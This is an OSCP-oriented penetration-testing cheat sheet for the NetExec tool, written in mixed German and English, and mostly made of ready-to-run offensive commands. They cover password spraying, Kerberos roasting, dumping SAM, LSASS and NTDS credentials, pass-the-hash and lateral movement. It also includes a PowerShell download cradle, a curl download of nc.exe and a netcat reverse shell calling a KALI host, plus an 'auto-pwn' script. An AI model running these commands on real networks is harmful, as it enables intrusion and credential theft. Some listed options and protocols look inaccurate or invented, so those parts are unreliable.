# NetExec (nxc) - Complete Modern Penetration Testing Guide

## Table of Contents
1. [Installation & Setup](#1-installation--setup)
2. [NetExec vs CrackMapExec](#2-netexec-vs-crackmapexec)
3. [Basic Concepts](#3-basic-concepts)
4. [Protocol Overview](#4-protocol-overview)
5. [Authentication Methods](#5-authentication-methods)
6. [Enumeration](#6-enumeration)
7. [Password Attacks](#7-password-attacks)
8. [Command Execution](#8-command-execution)
9. [Module System](#9-module-system)
10. [Credential Dumping](#10-credential-dumping)
11. [Lateral Movement](#11-lateral-movement)
12. [New Features in NetExec](#12-new-features-in-netexec)
13. [Common OSCP Patterns](#13-common-oscp-patterns)
14. [Troubleshooting](#14-troubleshooting)
15. [Quick Reference](#15-quick-reference)

---

## 1. Installation & Setup

### 1.1 Installation

```bash
# Via pipx (Empfohlen!)
sudo apt install pipx
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec

# Via pip
pip install netexec

# Kali Linux (wenn verfügbar)
sudo apt update
sudo apt install netexec

# Verify Installation
nxc --version
```

### 1.2 Alias Setup

```bash
# Für Kompatibilität mit CME
echo "alias cme='nxc'" >> ~/.bashrc
echo "alias crackmapexec='nxc'" >> ~/.zshrc
source ~/.bashrc

# Verify
nxc --version
cme --version  # Sollte nxc aufrufen
```

### 1.3 Database Management

```bash
# Database Location
~/.nxc/workspaces/

# Database Info anzeigen
nxc smb --list-db

# Workspace wechseln
nxc --workspace oscp

# Database löschen (Fresh Start)
rm -rf ~/.nxc/

# Export Credentials
nxc smb --export creds.csv
nxc smb --export hosts.csv
```

### 1.4 Configuration

```bash
# Config Location
~/.nxc/nxc.conf

# Config anzeigen
cat ~/.nxc/nxc.conf

# Wichtige Settings
[nxc]
workspace=default
pwn3d_label=Pwn3d!
log_mode=write
timeout=10
```

---

## 2. NetExec vs CrackMapExec

### 2.1 Wichtige Unterschiede

| Feature | CrackMapExec | NetExec |
|---------|--------------|---------|
| **Command** | `crackmapexec` | `nxc` (kürzer!) |
| **Entwicklung** | Nicht mehr aktiv | Aktiv entwickelt |
| **Module** | ~50 Module | 100+ Module |
| **Performance** | Langsamer | Schneller (Threading) |
| **Database** | SQLite | Optimierte SQLite |
| **Protocols** | 7 Protokolle | 10+ Protokolle |
| **Output** | Basic | Farbig + strukturiert |
| **OPSEC** | Basic | Erweiterte OPSEC Features |

### 2.2 Syntax-Kompatibilität

```bash
# 99% CME-Befehle funktionieren in NetExec!
crackmapexec smb 192.168.1.10 -u admin -p pass
nxc smb 192.168.1.10 -u admin -p pass  # Identisch!

# Nur Command-Name unterschiedlich
cme → nxc
crackmapexec → netexec (oder nxc)
```

### 2.3 Neue Protokolle in NetExec

```bash
# Zusätzlich zu CME (smb, winrm, mssql, rdp, ldap, ssh, ftp):
nxc vnc 192.168.1.10          # VNC
nxc nfs 192.168.1.10          # NFS
nxc smb2 192.168.1.10         # SMBv2 specific
nxc wmi 192.168.1.10          # WMI (separate)
```

### 2.4 Migration von CME zu NetExec

```bash
# Database Migration
cp -r ~/.cme/workspaces/ ~/.nxc/workspaces/

# Alle alten CME-Befehle funktionieren
# Einfach "crackmapexec" durch "nxc" ersetzen!
```

---

## 3. Basic Concepts

### 3.1 Command Structure

```bash
nxc <protocol> <target> [options]
```

| Component | Beschreibung | Beispiel |
|-----------|--------------|----------|
| `protocol` | smb, winrm, ldap, mssql, ssh, rdp, ftp, vnc, nfs | `smb` |
| `target` | IP, CIDR, Hostname, File | `192.168.1.10` |
| `options` | Auth, Actions, Modules, Flags | `-u user -p pass` |

### 3.2 Output Format (Verbessert!)

```bash
# NetExec Output (Farbig + strukturiert)
SMB    192.168.1.10    445    DC01    [*] Windows 10.0 Build 19041 x64 (name:DC01) (domain:corp.local)
SMB    192.168.1.10    445    DC01    [+] corp.local\admin:Password123! (Pwn3d!)
SMB    192.168.1.10    445    DC01    [+] Enumerated shares
SMB    192.168.1.10    445    DC01           Share      Permissions     Remark
SMB    192.168.1.10    445    DC01           -----      -----------     ------
SMB    192.168.1.10    445    DC01           ADMIN$     READ,WRITE      Remote Admin
SMB    192.168.1.10    445    DC01           C$         READ,WRITE      Default share
```

**Farbcodes:**
- 🟢 Grün = Success (Pwn3d!)
- 🔵 Blau = Info
- 🔴 Rot = Failed
- 🟡 Gelb = Warning

### 3.3 Target Specification

```bash
# Single IP
nxc smb 192.168.1.10

# CIDR Range
nxc smb 192.168.1.0/24

# IP Range
nxc smb 192.168.1.1-50

# Multiple IPs
nxc smb 192.168.1.10,192.168.1.20,192.168.1.30

# File (ein IP pro Zeile)
nxc smb targets.txt

# Domain Name
nxc smb DC01.corp.local

# Mit Port (non-standard)
nxc smb 192.168.1.10:4445
```

---

## 4. Protocol Overview

### 4.1 SMB (Port 445)

**Use Case:** Windows File Shares, Command Execution, Credential Dumping

```bash
# Basic SMB Check
nxc smb 192.168.1.10

# Mit Credentials
nxc smb 192.168.1.10 -u administrator -p 'Password123!'

# SMB Version Detection
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# SMB Signing Check
nxc smb 192.168.1.0/24 --signing
```

### 4.2 WinRM (Port 5985/5986)

**Use Case:** PowerShell Remoting

```bash
# WinRM Check
nxc winrm 192.168.1.10 -u user -p password

# SSL/HTTPS (Port 5986)
nxc winrm 192.168.1.10:5986 -u admin -p pass --ssl

# Command Execution
nxc winrm 192.168.1.10 -u admin -p pass -x whoami
```

### 4.3 LDAP (Port 389/636)

**Use Case:** Active Directory Enumeration

```bash
# LDAP Authentication
nxc ldap 192.168.1.10 -u user -p password

# LDAPS (SSL, Port 636)
nxc ldap 192.168.1.10:636 -u user -p pass --ssl

# User Enumeration
nxc ldap 192.168.1.10 -u user -p pass --users

# Kerberos Attacks
nxc ldap 192.168.1.10 -u user -p pass --asreproast output.txt
nxc ldap 192.168.1.10 -u user -p pass --kerberoasting output.txt
```

### 4.4 MSSQL (Port 1433)

**Use Case:** Microsoft SQL Server

```bash
# MSSQL Authentication
nxc mssql 192.168.1.10 -u sa -p password

# Windows Auth
nxc mssql 192.168.1.10 -u 'DOMAIN\user' -p pass

# xp_cmdshell
nxc mssql 192.168.1.10 -u sa -p pass -x whoami

# Query Execution
nxc mssql 192.168.1.10 -u sa -p pass -q "SELECT @@version"
```

### 4.5 SSH (Port 22)

**Use Case:** Linux/Unix Systems

```bash
# SSH Password
nxc ssh 192.168.1.10 -u root -p toor

# SSH Key
nxc ssh 192.168.1.10 -u root --key-file ~/.ssh/id_rsa

# Sudo Support (NEU in NetExec!)
nxc ssh 192.168.1.10 -u user -p pass --sudo-check
```

### 4.6 RDP (Port 3389)

**Use Case:** Remote Desktop Credential Validation

```bash
# RDP Check
nxc rdp 192.168.1.10 -u administrator -p password

# NLA Check
nxc rdp 192.168.1.10 --nla-check

# Screenshot (NEU!)
nxc rdp 192.168.1.10 -u admin -p pass --screenshot
```

### 4.7 FTP (Port 21)

**Use Case:** FTP Credential Validation

```bash
# FTP Authentication
nxc ftp 192.168.1.10 -u admin -p password

# Anonymous Check
nxc ftp 192.168.1.0/24 -u anonymous -p ''

# File Listing
nxc ftp 192.168.1.10 -u admin -p pass --ls
```

### 4.8 VNC (Port 5900) - NEU!

**Use Case:** VNC Remote Desktop

```bash
# VNC Authentication
nxc vnc 192.168.1.10 -p password

# VNC Screenshot
nxc vnc 192.168.1.10 -p pass --screenshot
```

### 4.9 NFS (Port 2049) - NEU!

**Use Case:** Network File System

```bash
# NFS Share Enumeration
nxc nfs 192.168.1.10

# Mount Check
nxc nfs 192.168.1.10 --shares
```

---

## 5. Authentication Methods

### 5.1 Username/Password

```bash
# Single User
nxc smb 192.168.1.10 -u administrator -p 'Password123!'

# Multiple Users (file)
nxc smb 192.168.1.10 -u users.txt -p password

# Multiple Passwords (file)
nxc smb 192.168.1.10 -u admin -p passwords.txt

# User + Password Lists
nxc smb 192.168.1.10 -u users.txt -p passwords.txt

# Empty Password
nxc smb 192.168.1.10 -u admin -p ''
```

### 5.2 Password Spray (Improved!)

```bash
# Password Spray mit --continue-on-success
nxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success

# --no-bruteforce (verhindert Lockout!)
nxc smb 192.168.1.0/24 -u users.txt -p pass --no-bruteforce --continue-on-success

# Mit Delay (OPSEC!)
nxc smb 192.168.1.0/24 -u users.txt -p pass --delay 5 --continue-on-success

# Fail-Limit (Stop nach X Fails)
nxc smb 192.168.1.0/24 -u users.txt -p pass --fail-limit 3
```

### 5.3 NTLM Hash (Pass-the-Hash)

```bash
# Full Hash (LM:NT)
nxc smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Nur NT Hash
nxc smb 192.168.1.10 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Hash File
nxc smb 192.168.1.10 -u admin -H hashes.txt

# Hash aus Database
nxc smb 192.168.1.0/24 --use-db-creds
```

### 5.4 Domain Authentication

```bash
# Mit -d Flag
nxc smb 192.168.1.10 -u user -p pass -d corp.local

# DOMAIN\user Format
nxc smb 192.168.1.10 -u 'corp.local\user' -p password

# Local Admin (nicht Domain!)
nxc smb 192.168.1.10 -u administrator -p pass --local-auth

# Local + Domain gleichzeitig testen
nxc smb 192.168.1.10 -u admin -p pass --local-auth --continue-on-success
nxc smb 192.168.1.10 -u admin -p pass -d CORP --continue-on-success
```

### 5.5 Kerberos Authentication

```bash
# Kerberos Ticket verwenden
export KRB5CCNAME=/tmp/ticket.ccache
nxc smb dc01.corp.local --use-kcache

# Kerberos mit Password
nxc smb dc01.corp.local -u user -p pass --kerberos

# AES Key (NEU!)
nxc smb 192.168.1.10 -u admin --aes-key <aes256_key>
```

### 5.6 Credential Spray from Database

```bash
# Alle gefundenen Creds automatisch testen
nxc smb 192.168.1.0/24 --use-db-creds

# Creds auf neues Netzwerk testen
nxc smb 10.10.10.0/24 --use-db-creds --continue-on-success
```

---

## 6. Enumeration

### 6.1 Network Enumeration

```bash
# SMB Hosts finden
nxc smb 192.168.1.0/24

# Mit Details (OS, Hostname, Domain)
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt

# SMB Signing Status
nxc smb 192.168.1.0/24 --signing

# Nur Signing disabled (Relay-Targets!)
nxc smb 192.168.1.0/24 --gen-relay-list unsigned_targets.txt --signing
```

### 6.2 Share Enumeration

```bash
# Basic Share List
nxc smb 192.168.1.10 -u user -p pass --shares

# Mit Permissions
nxc smb 192.168.1.10 -u user -p pass --shares --filter-shares READ WRITE

# Readable Shares only
nxc smb 192.168.1.10 -u user -p pass --shares --filter-shares READ

# Spider Shares (rekursiv durchsuchen)
nxc smb 192.168.1.10 -u user -p pass -M spider_plus

# Pattern-basierte Suche
nxc smb 192.168.1.10 -u user -p pass -M spider_plus -o PATTERN='password|backup|config'
```

### 6.3 User Enumeration

```bash
# Domain Users
nxc smb 192.168.1.10 -u user -p pass --users

# Mit Details (Beschreibung, etc.)
nxc ldap 192.168.1.10 -u user -p pass --users --detailed

# RID Bruteforce (Null Session)
nxc smb 192.168.1.10 -u '' -p '' --rid-brute

# Password Policy
nxc smb 192.168.1.10 -u user -p pass --pass-pol

# Admin Users finden
nxc smb 192.168.1.10 -u user -p pass --users | grep -i admin
```

### 6.4 Group Enumeration

```bash
# Domain Groups
nxc smb 192.168.1.10 -u user -p pass --groups

# Group Members
nxc ldap 192.168.1.10 -u user -p pass --groups "Domain Admins"

# Local Admin Group
nxc smb 192.168.1.10 -u user -p pass --local-groups

# User's Group Membership
nxc ldap 192.168.1.10 -u user -p pass -M groupmembership -o USER=administrator
```

### 6.5 Session Enumeration

```bash
# Logged-in Users
nxc smb 192.168.1.10 -u user -p pass --sessions

# Alle Hosts im Netzwerk
nxc smb 192.168.1.0/24 -u user -p pass --sessions

# LoggedOn Users (NEU!)
nxc smb 192.168.1.10 -u user -p pass --loggedon-users

# Admin Sessions finden
nxc smb 192.168.1.0/24 -u user -p pass --sessions | grep -i admin
```

### 6.6 Advanced Enumeration

```bash
# Disks
nxc smb 192.168.1.10 -u user -p pass --disks

# Interfaces
nxc smb 192.168.1.10 -u admin -p pass --interfaces

# Computer Accounts
nxc ldap 192.168.1.10 -u user -p pass --computers

# Trusts
nxc ldap 192.168.1.10 -u user -p pass -M enum_trusts

# CA (Certificate Authority)
nxc ldap 192.168.1.10 -u user -p pass -M enum_ca
```

---

## 7. Password Attacks

### 7.1 Password Spray (Safe)

```bash
# Basic Password Spray
nxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success

# Mit Lockout-Schutz
# 1. Policy prüfen
nxc smb DC01 -u user -p pass --pass-pol

# 2. Spray mit Delay
nxc smb 192.168.1.0/24 -u users.txt -p 'Password1!' --delay 5 --continue-on-success

# 3. Nur Domain Users
nxc smb 192.168.1.0/24 -u users.txt -p pass -d CORP --continue-on-success

# 4. Failed-Limit setzen
nxc smb 192.168.1.0/24 -u users.txt -p pass --fail-limit 3
```

### 7.2 ASREPRoast

```bash
# ASREPRoastable Users finden
nxc ldap 192.168.1.10 -u user -p pass --asreproast asrep_hashes.txt

# Ohne Credentials (Null Session, wenn möglich)
nxc ldap 192.168.1.10 -u '' -p '' --asreproast asrep.txt

# Hashcat Crack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John Crack
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

### 7.3 Kerberoast

```bash
# Kerberoastable SPNs finden
nxc ldap 192.168.1.10 -u user -p pass --kerberoasting kerb_hashes.txt

# Nur RC4 (schwächere Encryption, leichter zu cracken)
nxc ldap 192.168.1.10 -u user -p pass --kerberoasting kerb.txt --rc4

# Hashcat Crack
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# John Crack
john --wordlist=/usr/share/wordlists/rockyou.txt kerb_hashes.txt
```

### 7.4 Credential Dumping

```bash
# SAM Dump (Local Admin required)
nxc smb 192.168.1.10 -u administrator -p pass --sam

# LSA Secrets (Cached Creds, Service Accounts)
nxc smb 192.168.1.10 -u admin -p pass --lsa

# NTDS.dit (Domain Controller + DA required!)
nxc smb DC01 -u 'CORP\Administrator' -p pass --ntds

# DPAPI Secrets (NEU!)
nxc smb 192.168.1.10 -u admin -p pass --dpapi
```

---

## 8. Command Execution

### 8.1 Basic Execution

```bash
# CMD Command (-x)
nxc smb 192.168.1.10 -u admin -p pass -x whoami

# PowerShell Command (-X)
nxc smb 192.168.1.10 -u admin -p pass -X '$PSVersionTable'

# WinRM Execution
nxc winrm 192.168.1.10 -u admin -p pass -x ipconfig

# MSSQL xp_cmdshell
nxc mssql 192.168.1.10 -u sa -p pass -x whoami

# SSH Execution
nxc ssh 192.168.1.10 -u root -p pass -x 'uname -a'
```

### 8.2 Execution Methods

```bash
# wmiexec (Default)
nxc smb 192.168.1.10 -u admin -p pass -x whoami

# atexec (Task Scheduler - weniger Logs!)
nxc smb 192.168.1.10 -u admin -p pass -x whoami --exec-method atexec

# smbexec (Legacy)
nxc smb 192.168.1.10 -u admin -p pass -x whoami --exec-method smbexec

# mmcexec (NEU in NetExec!)
nxc smb 192.168.1.10 -u admin -p pass -x whoami --exec-method mmcexec
```

**OPSEC Ranking:**
1. `mmcexec` - Am wenigsten bekannt, wenig AV-Detection
2. `atexec` - Weniger Logs
3. `wmiexec` - Standard, mehr Logs
4. `smbexec` - Legacy, viele Logs

### 8.3 File Operations

```bash
# File Upload
nxc smb 192.168.1.10 -u admin -p pass --put-file /root/nc.exe C:\\temp\\nc.exe

# File Download
nxc smb 192.168.1.10 -u admin -p pass --get-file C:\\windows\\system32\\config\\sam /tmp/sam

# Multiple Files
nxc smb 192.168.1.10 -u admin -p pass --put-file payload.exe C:\\temp\\payload.exe
nxc smb 192.168.1.10 -u admin -p pass -x 'C:\temp\payload.exe'
```

### 8.4 Advanced Execution

```bash
# Execute on multiple hosts
nxc smb 192.168.1.0/24 -u admin -p pass -x whoami

# Mit Output Redirect
nxc smb 192.168.1.10 -u admin -p pass -x 'whoami > C:\temp\out.txt'

# PowerShell Download Cradle
nxc smb 192.168.1.10 -u admin -p pass -X 'IEX(New-Object Net.WebClient).DownloadString("http://KALI/shell.ps1")'

# Execute Script
nxc smb 192.168.1.10 -u admin -p pass -X 'IEX(Get-Content script.ps1)'
```

---

## 9. Module System

### 9.1 Module Basics

```bash
# Module auflisten
nxc smb -L

# Module Info
nxc smb -M spider_plus --module-info

# Module Options
nxc smb -M MODULE_NAME --options

# Module verwenden
nxc smb 192.168.1.10 -u user -p pass -M MODULE_NAME -o OPTION=value
```

### 9.2 Essential Modules

#### spider_plus - File Search

```bash
# Basic Spider
nxc smb 192.168.1.10 -u user -p pass -M spider_plus

# Custom Pattern
nxc smb 192.168.1.10 -u user -p pass -M spider_plus -o PATTERN='password|backup|config'

# Specific Extensions
nxc smb 192.168.1.10 -u user -p pass -M spider_plus -o EXTENSIONS='txt,docx,xlsx,pdf'

# Max Depth
nxc smb 192.168.1.10 -u user -p pass -M spider_plus -o MAX_DEPTH=5

# Output Location
cat ~/.nxc/logs/spider_plus/*.json
```

#### lsassy - Modern Credential Dumping

```bash
# LSASS Dump (besser als mimikatz!)
nxc smb 192.168.1.10 -u admin -p pass -M lsassy

# Multiple Targets
nxc smb 192.168.1.0/24 -u admin -H HASH -M lsassy

# Mit Method Option
nxc smb 192.168.1.10 -u admin -p pass -M lsassy -o METHOD=comsvcs
```

#### nanodump - Stealthy LSASS Dump (NEU!)

```bash
# Nanodump (OPSEC-freundlich!)
nxc smb 192.168.1.10 -u admin -p pass -M nanodump

# Output
cat ~/.nxc/logs/nanodump_*.dmp
```

#### handlekatz - Handle Dumping (NEU!)

```bash
# Dump process handles (Alternative zu Mimikatz)
nxc smb 192.168.1.10 -u admin -p pass -M handlekatz
```

#### enum_avproducts - AV Detection

```bash
# Antivirus erkennen
nxc smb 192.168.1.10 -u user -p pass -M enum_avproducts

# Alle Hosts scannen
nxc smb 192.168.1.0/24 -u user -p pass -M enum_avproducts
```

#### gpp_password - Group Policy Passwords

```bash
# GPP Passwords in SYSVOL
nxc smb 192.168.1.10 -u user -p pass -M gpp_password
```

#### gpp_autologin - Autologin Credentials

```bash
# Registry Autologin
nxc smb 192.168.1.10 -u admin -p pass -M gpp_autologin
```

#### enum_trusts - Domain Trusts (NEU!)

```bash
# Domain Trust Enumeration
nxc ldap 192.168.1.10 -u user -p pass -M enum_trusts
```

#### enum_ca - Certificate Authority (NEU!)

```bash
# CA Enumeration (für ESC Attacks!)
nxc ldap 192.168.1.10 -u user -p pass -M enum_ca
```

#### ldap-checker - LDAP Signing Check

```bash
# LDAP Signing/Channel Binding Check
nxc ldap 192.168.1.10 -u user -p pass -M ldap-checker
```

#### adcs - ADCS Enumeration (NEU!)

```bash
# Active Directory Certificate Services
nxc ldap 192.168.1.10 -u user -p pass -M adcs
```

#### zerologon - Zerologon Scan (NEU!)

```bash
# Zerologon Vulnerability Check
nxc smb 192.168.1.10 -M zerologon
```

#### petitpotam - PetitPotam Scan (NEU!)

```bash
# PetitPotam Vulnerability Check
nxc smb 192.168.1.10 -u user -p pass -M petitpotam
```

#### nopac - sAMAccountName Spoofing (NEU!)

```bash
# NoPac/sAMAccountName Vulnerability
nxc smb 192.168.1.10 -u user -p pass -M nopac
```

---

## 10. Credential Dumping

### 10.1 Local Credentials

```bash
# SAM Database
nxc smb 192.168.1.10 -u administrator -p pass --sam

# LSA Secrets
nxc smb 192.168.1.10 -u admin -p pass --lsa

# LSASS (lsassy module)
nxc smb 192.168.1.10 -u admin -p pass -M lsassy

# DPAPI (NEU!)
nxc smb 192.168.1.10 -u admin -p pass --dpapi

# All-in-One
nxc smb 192.168.1.10 -u admin -p pass --sam --lsa --dpapi
```

### 10.2 Domain Credentials

```bash
# NTDS.dit (DC + DA required!)
nxc smb DC01 -u 'CORP\Administrator' -p pass --ntds

# Mit VSS (Volume Shadow Copy)
nxc smb DC01 -u admin -p pass --ntds vss

# Nur bestimmte User
nxc smb DC01 -u admin -p pass --ntds --user administrator

# DIT + SYSTEM Hive
nxc smb DC01 -u admin -p pass --ntds --outputfile ntds_dump
```

### 10.3 Credential Reuse

```bash
# Database Creds verwenden
nxc smb 192.168.1.0/24 --use-db-creds

# Export Creds
nxc smb --export creds.csv

# Import in andere Tools
cat creds.csv | grep NTLM | cut -d, -f2,3,4
```

---

## 11. Lateral Movement

### 11.1 Pass-the-Hash

```bash
# Single Target
nxc smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Network Sweep
nxc smb 192.168.1.0/24 -u admin -H HASH --continue-on-success

# Mit Command Execution
nxc smb 192.168.1.0/24 -u admin -H HASH -x whoami

# SAM Dump auf allen Hosts
nxc smb 192.168.1.0/24 -u admin -H HASH --sam
```

### 11.2 Pass-the-Ticket

```bash
# Kerberos Ticket verwenden
export KRB5CCNAME=/tmp/administrator.ccache
nxc smb dc01.corp.local --use-kcache

# Mit Domain
nxc smb dc01.corp.local -u admin -p pass --kerberos

# Ticket + Command
nxc smb dc01.corp.local --use-kcache -x whoami
```

### 11.3 Overpass-the-Hash (NEU!)

```bash
# NTLM Hash → Kerberos Ticket
nxc smb dc01.corp.local -u admin -H HASH --kerberos

# AES Key verwenden
nxc smb dc01.corp.local -u admin --aes-key AES256_KEY
```

### 11.4 Token Impersonation

```bash
# Tokens auflisten
nxc smb 192.168.1.10 -u admin -p pass -M tokens

# Mit anderen Tools kombinieren (z.B. Cobalt Strike)
```

---

## 12. New Features in NetExec

### 12.1 Improved Performance

```bash
# Schnelleres Threading
nxc smb 192.168.1.0/24 -u admin -p pass -t 200  # 200 Threads!

# Connection Pooling (NEU!)
# → Automatisch, keine Config nötig

# Timeout Control
nxc smb 192.168.1.0/24 --timeout 5  # 5 Sekunden Timeout
```

### 12.2 Enhanced OPSEC

```bash
# Jitter (Random Delay zwischen Requests)
nxc smb 192.168.1.0/24 -u user -p pass --jitter 10

# Random User-Agent (bei HTTP)
nxc smb 192.168.1.10 -u user -p pass --random-agent

# Custom User-Agent
nxc smb 192.168.1.10 -u user -p pass --user-agent "Mozilla/5.0..."

# Execution Method für OPSEC
nxc smb 192.168.1.10 -u admin -p pass -x whoami --exec-method mmcexec
```

### 12.3 Better Output

```bash
# JSON Output
nxc smb 192.168.1.0/24 -u user -p pass --json output.json

# Export zu CSV
nxc smb --export creds.csv
nxc smb --export hosts.csv

# Verbose Output
nxc smb 192.168.1.10 -u user -p pass -v
nxc smb 192.168.1.10 -u user -p pass -vv  # Extra verbose!

# No Color (für Logs)
nxc smb 192.168.1.10 -u user -p pass --no-color
```

### 12.4 Protocol Improvements

```bash
# SMB3 Support
nxc smb 192.168.1.10 -u user -p pass --smb3

# LDAPS Default (Port 636)
nxc ldap 192.168.1.10:636 -u user -p pass

# WinRM SSL
nxc winrm 192.168.1.10:5986 -u user -p pass --ssl
```

### 12.5 New Vulnerability Checks

```bash
# Zerologon
nxc smb DC01 -M zerologon

# PetitPotam
nxc smb 192.168.1.10 -u user -p pass -M petitpotam

# NoPac
nxc smb 192.168.1.10 -u user -p pass -M nopac

# PrintNightmare
nxc smb 192.168.1.10 -u user -p pass -M printnightmare

# MS17-010 (EternalBlue)
nxc smb 192.168.1.10 -M ms17-010
```

---

## 13. Common OSCP Patterns

### 13.1 Pattern 1: Initial Foothold

```bash
# 1. Network Discovery
nxc smb 192.168.1.0/24

# 2. Null Session Check
nxc smb 192.168.1.0/24 -u '' -p '' --shares

# 3. Guest Account
nxc smb 192.168.1.0/24 -u 'guest' -p ''

# 4. RID Bruteforce
nxc smb 192.168.1.10 -u '' -p '' --rid-brute 10000

# 5. SMB Signing Check
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

### 13.2 Pattern 2: Credential Validation

```bash
# Found Creds testen
nxc smb 192.168.1.10 -u user -p 'FoundPassword!'

# Alle Protokolle durchprobieren
for proto in smb winrm mssql rdp ssh ldap; do
    nxc $proto 192.168.1.10 -u user -p pass
done

# Über gesamtes Netzwerk
nxc smb 192.168.1.0/24 -u user -p pass --continue-on-success
```

### 13.3 Pattern 3: Domain Enumeration

```bash
# 1. Password Policy
nxc smb DC01 -u user -p pass --pass-pol

# 2. Users
nxc ldap DC01 -u user -p pass --users > users.txt

# 3. Groups
nxc ldap DC01 -u user -p pass --groups

# 4. Shares (alle Hosts)
nxc smb 192.168.1.0/24 -u user -p pass --shares

# 5. Sessions (wer ist wo?)
nxc smb 192.168.1.0/24 -u user -p pass --sessions

# 6. Logged-On Users
nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users
```

### 13.4 Pattern 4: Password Spray

```bash
# 1. Policy prüfen
nxc smb DC01 -u user -p pass --pass-pol

# 2. User List erstellen
nxc ldap DC01 -u user -p pass --users | grep "name:" | cut -d: -f2 > users.txt

# 3. Safe Spray
nxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success --delay 5

# 4. Erfolgreiche Creds testen
nxc smb 192.168.1.0/24 --use-db-creds --continue-on-success
```

### 13.5 Pattern 5: Post-Exploitation (Pwn3d!)

```bash
# 1. Credential Dumping
nxc smb 192.168.1.10 -u admin -p pass --sam --lsa
nxc smb 192.168.1.10 -u admin -p pass -M lsassy

# 2. File Search
nxc smb 192.168.1.10 -u admin -p pass -M spider_plus -o PATTERN='password|backup'

# 3. Lateral Movement (mit Hash!)
nxc smb 192.168.1.0/24 -u administrator -H HASH --sam

# 4. Domain Admin Path
nxc ldap DC01 -u admin -p pass --users | grep "Domain Admins"
nxc smb 192.168.1.0/24 -u admin -p pass --sessions | grep -i "Domain Admins"
```

### 13.6 Pattern 6: Kerberos Attacks

```bash
# 1. ASREPRoast
nxc ldap DC01 -u user -p pass --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# 2. Kerberoast
nxc ldap DC01 -u user -p pass --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Mit gecracketem Pass lateral moven
nxc smb 192.168.1.0/24 -u svc_account -p 'CrackedPass!' --continue-on-success
```

### 13.7 Pattern 7: MSSQL Exploitation

```bash
# 1. MSSQL Discovery
nxc mssql 192.168.1.0/24 -u user -p pass

# 2. xp_cmdshell
nxc mssql 192.168.1.10 -u sa -p pass -x whoami

# 3. File Download (von Kali)
nxc mssql 192.168.1.10 -u sa -p pass -x "curl http://KALI/nc.exe -o C:\temp\nc.exe"

# 4. Reverse Shell
# Kali: nc -lvnp 4444
nxc mssql 192.168.1.10 -u sa -p pass -x "C:\temp\nc.exe -e cmd.exe KALI_IP 4444"
```

### 13.8 Pattern 8: Full Auto-Pwn

```bash
# Auto-Pwn Script für OSCP
#!/bin/bash
TARGET="192.168.1.0/24"
USER="admin"
HASH="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

# Network Scan
nxc smb $TARGET | tee network_scan.txt

# Credential Validation
nxc smb $TARGET -u $USER -H $HASH --continue-on-success | tee cred_check.txt

# SAM Dump (alle Pwn3d! Hosts)
nxc smb $TARGET -u $USER -H $HASH --sam | tee sam_dump.txt

# LSASS Dump
nxc smb $TARGET -u $USER -H $HASH -M lsassy | tee lsass_dump.txt

# Share Spider
nxc smb $TARGET -u $USER -H $HASH -M spider_plus -o PATTERN='password|backup'

# Session Enumeration
nxc smb $TARGET -u $USER -H $HASH --sessions | tee sessions.txt
```

---

## 14. Troubleshooting

### 14.1 Connection Errors

```bash
# Problem: Connection timeout
# Lösung: Timeout erhöhen
nxc smb 192.168.1.10 -u user -p pass --timeout 15

# Problem: SMB nicht erreichbar
# Check:
nmap -p445 192.168.1.10
nxc smb 192.168.1.10  # Simple connectivity test
```

### 14.2 Authentication Errors

```bash
# STATUS_LOGON_FAILURE
# → Falsches Passwort/Username

# STATUS_ACCESS_DENIED
# → Keine Admin-Rechte (trotzdem [+])
# Lösung: Trotzdem Enumeration möglich!
nxc smb 192.168.1.10 -u user -p pass --shares

# STATUS_ACCOUNT_LOCKED_OUT
# → Account gesperrt!
# Check Policy:
nxc smb DC -u user -p pass --pass-pol

# KDC_ERR_PREAUTH_FAILED
# → Kerberos failed, nutze NTLM
nxc smb 192.168.1.10 -u user -p pass --no-kerberos
```

### 14.3 Hash Format Issues

```bash
# Korrektes Format:
# LM:NT (Full)
nxc smb IP -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Nur NT
nxc smb IP -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

# secretsdump Output:
# admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# → Nutze die Hashes zwischen :: und :::
```

### 14.4 Module Errors

```bash
# Module nicht gefunden
nxc smb -L | grep MODULE_NAME

# Module Output Location
ls -la ~/.nxc/logs/

# Module Options prüfen
nxc smb -M spider_plus --options
```

### 14.5 Performance Issues

```bash
# Zu langsam?
# Lösung: Threads erhöhen
nxc smb 192.168.1.0/24 -u user -p pass -t 200

# Timeout Errors?
# Lösung: Timeout erhöhen
nxc smb 192.168.1.0/24 --timeout 15

# Database zu groß?
# Lösung: Database cleanen
rm -rf ~/.nxc/
```

---

## 15. Quick Reference

### 15.1 Essential Commands

```bash
# === NETWORK DISCOVERY ===
nxc smb 192.168.1.0/24
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt

# === AUTHENTICATION ===
nxc smb IP -u admin -p password
nxc smb IP -u admin -H HASH
nxc smb IP -u admin -p pass -d DOMAIN
nxc smb IP -u admin -p pass --local-auth

# === ENUMERATION ===
nxc smb IP -u user -p pass --shares
nxc smb IP -u user -p pass --users
nxc smb IP -u user -p pass --groups
